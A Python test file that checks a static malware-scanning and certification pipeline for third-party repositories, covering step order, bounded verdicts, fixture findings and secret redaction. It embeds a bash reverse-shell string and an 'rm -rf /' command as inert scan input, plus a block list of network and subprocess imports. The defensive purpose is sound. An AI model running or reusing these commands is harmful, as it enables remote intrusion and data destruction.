"""OS Lab §41/§114/§143 certification checks — zero-framework (mirrors holding/test_registry.py). Run (from backend/):
    PYTHONPATH=backend:. DATABASE_URL=postgresql://u:p@localhost:5432/x python3 -m app.services.holding.os_lab.test_certification
"""
import json
import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[4]))   # backend/ on path so `app` is a package

from app.services.holding.os_lab import certification as c    # noqa: E402
from app.services.holding.os_lab import catalog                # noqa: E402
from app.services.holding.os_lab.catalog import Verdict, LabState   # noqa: E402

SRC = Path(c.__file__).read_text()
FIXTURE_TEXT = "\n".join(p.read_text() for p in sorted(c.FIXTURE_DIR.iterdir()) if p.is_file())


def _inv(files: dict[str, str], **kw) -> c.RepoInventory:
    return c.RepoInventory(name="t", canonical_source="https://example.invalid/t", files=[
        c.InvFile(p, len(s), "d" * 64, s) for p, s in files.items()], **kw)


CLEAN = {"LICENSE": "MIT", "README.md": "# t", "main.c": "int main(void){return 0;}"}
FULL = dict(observed_source="https://example.invalid/t", source_verified_at="2026-09-04T00:00:00Z",
            pinned_sha="a" * 40, license_id="MIT")


def run() -> bool:
    res = []
    def ck(n, ok):
        res.append(bool(ok)); print(f"  [{'PASS' if ok else 'FAIL'}] {n}")

    # ── (1) pipeline is typed + ordered ──
    ids = [s.id for s in c.PIPELINE]
    ck("PIPELINE is a tuple of frozen StepDef with unique ids",
       isinstance(c.PIPELINE, tuple) and all(isinstance(s, c.StepDef) for s in c.PIPELINE) and len(set(ids)) == len(ids))
    ck("spec order: canonical_upstream → pin_sha → license → … → obfuscation → build → network → QEMU → monitor → dynamic → artifact",
       ids == ["canonical_upstream", "pin_sha", "license", "file_inventory", "submodules", "git_lfs", "binary_blobs",
               "package_manifests", "install_hooks", "build_scripts", "dockerfiles", "ci_workflows", "shell_scripts",
               "network_destinations", "telemetry", "privileged_ops", "credential_reads", "persistence",
               "downloaded_binaries", "obfuscation", "isolated_build", "restricted_network", "qemu_vm_exec",
               "resource_monitoring", "dynamic_behavior", "artifact_inspection"])
    ck("every STATIC step names an existing pure check; every gated step has none + declares what it observes",
       all(callable(getattr(c, s.check, None)) for s in c.STATIC_STEPS)
       and all(s.check == "" and s.observes for s in c.GATED_STEPS))
    ck("dynamic_behavior observes fs/network/process/persistence/credential",
       set(c.PIPELINE[24].observes) == {"fs_mutations", "network_attempts", "process_tree", "persistence_attempts", "credential_access"})
    ck("StepStatus vocab is exactly PENDING/PASS/FAIL/SKIPPED/UNVERIFIED",
       {s.value for s in c.StepStatus} == {"PENDING", "PASS", "FAIL", "SKIPPED", "UNVERIFIED"})

    # ── (2) report template: everything PENDING + UNVERIFIED until a run ──
    t = c.new_report("x", "https://example.invalid/x")
    ck("new_report() template: every step PENDING, verdict UNVERIFIED, scope NOT_RUN, nothing executed",
       all(s.status == c.StepStatus.PENDING for s in t.steps) and t.verdict == Verdict.UNVERIFIED
       and t.scope == "NOT_RUN" and not any(t.executed.values()) and t.authority_plane == "KAI")

    # ── (3) bounded verdict vocabulary; the forbidden claims are absent from module + fixtures ──
    ck("verdict vocab is exactly the 4 bounded §114 values (reused from catalog.Verdict)",
       {v.value for v in Verdict} == {"NO_MALICIOUS_BEHAVIOR_DETECTED_IN_CERTIFIED_SCOPE", "SUSPICIOUS", "REJECTED", "UNVERIFIED"})
    forbidden = re.compile("MALWARE" + r"[_ -]?FREE|ABSOLUTELY[_ ]?SAFE|VERIFIED[_ ]?SAFE", re.I)
    ck("'MALWARE_FREE' / 'ABSOLUTELY SAFE' literals absent from certification.py and every fixture",
       not forbidden.search(SRC) and not forbidden.search(FIXTURE_TEXT))

    # ── (4) run on the §143 fixture inventory ──
    inv = c.fixture_inventory()
    rep = c.run_static(inv, at="2026-09-04T00:00:00Z")
    ck("fixture inventory read from disk (8 files) — no fetch", len(inv.files) == 8)
    ck("after run: no step PENDING; every step PASS/FAIL/UNVERIFIED/SKIPPED",
       all(s.status != c.StepStatus.PENDING for s in rep.steps))
    ck("every gated (build/network/QEMU/monitor/dynamic/artifact) step is SKIPPED with EXECUTION_GATED — never executed",
       all(rep.step(s.id).status == c.StepStatus.SKIPPED and rep.step(s.id).note == c.EXECUTION_GATED for s in c.GATED_STEPS))
    ck("report.executed says nothing was cloned/downloaded/installed/built/booted/fetched", not any(rep.executed.values()))
    ck("static steps yield PASS + FAIL + UNVERIFIED (canonical/pin/license honestly UNVERIFIED — not fetched)",
       {rep.step(s.id).status for s in c.STATIC_STEPS} == {c.StepStatus.PASS, c.StepStatus.FAIL, c.StepStatus.UNVERIFIED}
       and rep.step("canonical_upstream").status == c.StepStatus.UNVERIFIED == rep.step("pin_sha").status)
    ck("mimic repo verdict is REJECTED (HIGH findings) — bounded, deterministic",
       rep.verdict == Verdict.REJECTED and c.run_static(inv).verdict == Verdict.REJECTED)

    # ── (5) every §143 fixture is flagged AND escalates its step ──
    for fname, step in c.FIXTURE_EXPECT.items():
        sr = rep.step(step)
        hits = [f for f in sr.findings if f.path == fname and f.severity in c.ESCALATES]
        ck(f"§143 fixture {fname} → step {step} FAIL with ≥MEDIUM finding ({hits[0].severity if hits else '-'})",
           sr.status == c.StepStatus.FAIL and hits)
    ck("HIGH-tier fixtures (pipe-to-shell / cred path / persistence) carry HIGH findings",
       all(any(f.severity == "HIGH" and f.path == p for s in rep.steps for f in s.findings)
           for p in ("install.sh", "keyreader.py", "persist.sh")))
    ck("telemetry fixture also escalates the telemetry step",
       rep.step("telemetry").status == c.StepStatus.FAIL and any(f.path == "telemetry.py" for f in rep.step("telemetry").findings))
    ck("fixture hostnames use the reserved .invalid TLD (can never resolve) and shell fixtures exit before the mimic line",
       all(h.endswith(".invalid") for h in rep.step("network_destinations").evidence["hosts"])
       and all((c.FIXTURE_DIR / s).read_text().splitlines()[2] == "exit 0" for s in ("install.sh", "persist.sh")))

    # ── (6) clean inventories: static-only can NEVER reach the clean-scope verdict ──
    r0 = c.run_static(_inv(CLEAN))
    ck("clean inventory w/o pin/origin evidence → no FAIL, verdict UNVERIFIED (never PASS-by-absence)",
       not any(s.status == c.StepStatus.FAIL for s in r0.steps) and r0.verdict == Verdict.UNVERIFIED)
    r1 = c.run_static(_inv(CLEAN, **FULL))
    ck("clean inventory WITH origin+verified_at+sha+license: all STATIC steps PASS, gated SKIPPED → still UNVERIFIED",
       all(r1.step(s.id).status == c.StepStatus.PASS for s in c.STATIC_STEPS) and r1.verdict == Verdict.UNVERIFIED)
    ck("origin mismatch → canonical_upstream FAIL (HIGH) → REJECTED",
       c.run_static(_inv(CLEAN, **{**FULL, "observed_source": "https://example.invalid/other"})).verdict == Verdict.REJECTED)
    ck("origin with .git suffix / trailing slash / case == canonical (no false REJECT)",
       c.run_static(_inv(CLEAN, **{**FULL, "observed_source": "https://Example.invalid/t.git/"})).step("canonical_upstream").status == c.StepStatus.PASS)
    ck("malformed pin (not 40-hex) → FAIL → SUSPICIOUS",
       c.run_static(_inv(CLEAN, **{**FULL, "pinned_sha": "v1.2.3"})).verdict == Verdict.SUSPICIOUS)

    # ── (6b) categorical sweeps are REPO-WIDE: an ordinary source file (not a script) is still caught ──
    # (the strings below are INERT scan input — text the scanner must flag; nothing here is executed)
    rs = c.run_static(_inv({**CLEAN, "net.py": 'CMD = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'}))
    ck("reverse shell string in a .py → network_destinations FAIL (HIGH) → REJECTED",
       rs.step("network_destinations").status == c.StepStatus.FAIL and rs.verdict == Verdict.REJECTED)
    ds = c.run_static(_inv({**CLEAN, "clean.py": 'os.system("rm -rf / ")'}))
    ck("disk-wipe string in a .py → privileged_ops FAIL (HIGH) → REJECTED",
       ds.step("privileged_ops").status == c.StepStatus.FAIL and ds.verdict == Verdict.REJECTED)
    png = c.RepoInventory(name="t", canonical_source="https://example.invalid/t", files=[
        c.InvFile("LICENSE", 3, "d" * 64, "MIT"), c.InvFile("docs/shot.png", 10, "d" * 64, None, True),
        c.InvFile("vendor/tool.so", 10, "d" * 64, None, True)])
    bb = c.run_static(png).step("binary_blobs")
    ck("media binary → LOW (reported, not escalated); executable binary → MEDIUM → step FAIL",
       {f.path: f.severity for f in bb.findings} == {"docs/shot.png": "LOW", "vendor/tool.so": "MEDIUM"} and bb.status == c.StepStatus.FAIL)

    # ── (7) derive_verdict: clean-scope verdict is reachable ONLY when every step (incl. gated) is PASS ──
    allpass = [c.StepResult(s.id, s.title, s.phase.value, c.StepStatus.PASS) for s in c.PIPELINE]
    ck("derive_verdict(all PASS) → NO_MALICIOUS_BEHAVIOR_DETECTED_IN_CERTIFIED_SCOPE",
       c.derive_verdict(allpass) == Verdict.NO_MALICIOUS_BEHAVIOR_DETECTED_IN_CERTIFIED_SCOPE)
    one_skip = [c.StepResult(s.id, s.title, s.phase.value, c.StepStatus.SKIPPED if s.id == "qemu_vm_exec" else c.StepStatus.PASS) for s in c.PIPELINE]
    ck("one SKIPPED gated step → UNVERIFIED", c.derive_verdict(one_skip) == Verdict.UNVERIFIED)
    med = [c.StepResult("x", "x", "STATIC", c.StepStatus.FAIL, [c.Finding("x", "MEDIUM", "p", "d")])]
    hi = [c.StepResult("x", "x", "STATIC", c.StepStatus.FAIL, [c.Finding("x", "HIGH", "p", "d")])]
    ck("MEDIUM FAIL → SUSPICIOUS; HIGH → REJECTED; empty → UNVERIFIED",
       c.derive_verdict(med) == Verdict.SUSPICIOUS and c.derive_verdict(hi) == Verdict.REJECTED and c.derive_verdict([]) == Verdict.UNVERIFIED)

    # ── (8) no clone/build/QEMU/network capability in the module ──
    banned = re.compile(r"^\s*(?:import|from)\s+(?:subprocess|socket|urllib|http|requests|httpx|shutil|git|dulwich|pexpect|asyncio\.subprocess)\b", re.M)
    ck("no subprocess/socket/urllib/http/requests/git import in certification.py",
       not banned.search(SRC) and "os.system" not in SRC and "qemu-system" not in SRC and "git clone" not in SRC)
    ck("inventory_from_dir reads only (no write/mkdir/unlink/chmod calls)",
       not re.search(r"\.(?:write_text|write_bytes|mkdir|unlink|rename|chmod|rmtree)\(", SRC) and "open(" not in SRC.replace("finditer(", ""))

    # ── (9) secrets in a scanned file never leak into the report ──
    leak = c.run_static(_inv({**CLEAN, "cfg.py": 'AWS_KEY = "AKIAIOSFODNN7EXAMPLE"'}))
    js = c.to_json(leak)
    ck("AWS key in a scanned file is flagged (HIGH) but the key never appears in the JSON report",
       leak.verdict == Verdict.REJECTED and "AKIAIOSFODNN7EXAMPLE" not in js and "[REDACTED]" in js)
    ck("report is plain-JSON serializable with per-severity counts", isinstance(json.loads(js)["findings_by_severity"], dict))

    # ── (10) coordination with catalog.py: the report is evidence for the §113 lifecycle, never an authority ──
    e = catalog.get("virtme-ng", catalog.initial_catalog())
    catalog.advance(e, LabState.SOURCE_VERIFIED, actor="operator", reason="t", evidence={"verified_at": "t"})
    catalog.advance(e, LabState.PINNED, actor="operator", reason="t", evidence={"sha": "b" * 40})
    catalog.advance(e, LabState.QUARANTINED, actor="operator", reason="t", evidence={"path": "local"})
    catalog.advance(e, LabState.STATIC_REVIEW, actor="operator", reason="t", evidence={"started": True})
    rec = catalog.advance(e, LabState.REJECTED, actor="kai", reason="static cert REJECTED", evidence=rep.to_dict())
    ck("a REJECTED static report drives STATIC_REVIEW → REJECTED via catalog.advance (audited, evidence = report)",
       e.state == LabState.REJECTED and rec["evidence"]["verdict"] == "REJECTED" and e.certification == Verdict.UNVERIFIED)
    bad = False
    try:
        catalog.record_verdict(e, Verdict.NO_MALICIOUS_BEHAVIOR_DETECTED_IN_CERTIFIED_SCOPE, actor="kai", reason="t", evidence=r1.to_dict())
    except ValueError:
        bad = True
    ck("record_verdict refused outside SECURITY_REVIEW (the report cannot self-certify)", bad and e.certification == Verdict.UNVERIFIED)

    n, ok = len(res), sum(res)
    print(f"\nOS LAB CERTIFICATION TESTS: {ok}/{n} —", "PASS" if ok == n else "FAIL")
    return ok == n


def test_certification():
    assert run()


if __name__ == "__main__":
    raise SystemExit(0 if run() else 1)
